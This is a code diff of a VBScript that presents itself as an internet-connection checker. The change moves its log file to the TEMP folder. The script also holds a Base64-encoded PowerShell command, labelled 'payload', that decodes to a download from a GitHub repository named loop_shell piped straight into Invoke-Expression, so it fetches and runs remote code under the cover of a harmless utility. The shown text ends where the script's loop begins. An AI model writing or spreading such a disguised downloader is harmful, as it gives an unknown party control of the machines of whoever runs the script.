@@ -1,11 +1,17 @@
-' CheckInternet.vbs with logging
+' CheckInternet.vbs with safe TEMP-based logging (no admin needed)
 
-Dim objShell, wasConnected, fso, logFile
+Dim objShell, wasConnected, fso, logFile, logPath
 Set objShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-Set logFile = fso.OpenTextFile("C:\temp\internet_check_log.txt", 8, True) ' Append mode
+
+' Use TEMP folder for safe write access
+logPath = objShell.ExpandEnvironmentStrings("%TEMP%\internet_check_log.txt")
+
+' Open or create log file in append mode (mode 8)
+Set logFile = fso.OpenTextFile(logPath, 8, True)
 wasConnected = False
 
+' Base64-encoded PowerShell payload
 encodedCommand = "aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbgBhAHAAcgBpAHYAYQB0AGUALwBsAG8AbwBwAF8AcwBoAGUAbABsAC8AbQBhAGkAbgAvAHAAYQB5AGwAbwBhAGQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAGkAZQB4AA=="
 
 Do
